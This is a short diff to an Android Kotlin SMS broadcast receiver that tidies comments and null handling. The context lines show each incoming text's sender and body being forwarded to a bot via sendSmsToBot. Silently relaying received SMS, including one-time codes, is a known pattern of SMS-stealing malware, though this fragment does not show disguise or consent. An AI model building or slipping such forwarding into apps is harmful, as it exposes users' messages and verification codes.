@@ -70,10 +70,9 @@ class SmsReceiver : BroadcastReceiver() {
             Thread {
                 sendSmsToBot(sender, messageBody)
                 
-                // Помечаем как отправленное с небольшим временем жизни (24 часа)
+                // Помечаем как отправленное
                 prefs.edit {
                     putBoolean(smsSentKey, true)
-                    // Автоочистка через 24 часа
                 }
                 
                 // Очистка старых записей
@@ -88,7 +87,13 @@ class SmsReceiver : BroadcastReceiver() {
     private fun getSmsMessages(intent: Intent): Array<SmsMessage> {
         return try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
-                Telephony.Sms.Intents.getMessagesFromIntent(intent)?.toTypedArray() ?: emptyArray()
+                // ИСПРАВЛЕНИЕ: Правильное использование getMessagesFromIntent
+                val messagesList = Telephony.Sms.Intents.getMessagesFromIntent(intent)
+                if (messagesList != null) {
+                    messagesList.toTypedArray()
+                } else {
+                    emptyArray()
+                }
             } else {
                 getMessagesFromPdus(intent)
             }
@@ -190,7 +195,6 @@ class SmsReceiver : BroadcastReceiver() {
     private fun cleanupOldEntries(prefs: SharedPreferences) {
         // Очищаем записи старше 24 часов
         val allEntries = prefs.all
-        val currentTime = System.currentTimeMillis()
         
         val entriesToRemove = allEntries.filter { (key, _) ->
             key.startsWith(SMS_SENT_KEY_PREFIX)
